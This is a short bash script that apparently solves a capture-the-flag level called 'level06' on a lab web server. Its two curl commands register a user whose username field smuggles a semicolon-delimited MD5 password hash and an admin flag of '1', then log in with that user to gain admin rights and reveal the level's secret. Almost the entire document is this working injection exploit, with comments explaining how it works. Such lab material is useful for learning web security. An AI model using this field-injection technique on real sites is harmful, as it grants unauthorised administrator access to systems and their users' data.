#! /usr/bin/env bash

# User data to be registered.
user="a"
pass="a"

# Value to enable admin rights.
admin="1"

# Get the same hash that would be generated in server-side.
hash="$(echo -n "${pass}" | md5sum | cut -d ' ' -f 1)"

# Inject the hash and the value to enable admin rights after the username.
curl --data "user=${user};${hash};${admin}" --data "pass=${pass}" http://10.0.23.24:8002/level06/index.php

# Log into the page. Instead of looking up the hash generated by the server and the value to enable
# admin rights that is always set as '0' by the server, the data injected by the last command will
# be looked up. Since the hash is valid and the enable admin value is '1', the server will log the
# user in and reveal the secret.
curl --data "luser=${user}" --data "lpass=${pass}" http://10.0.23.24:8002/level06/index.php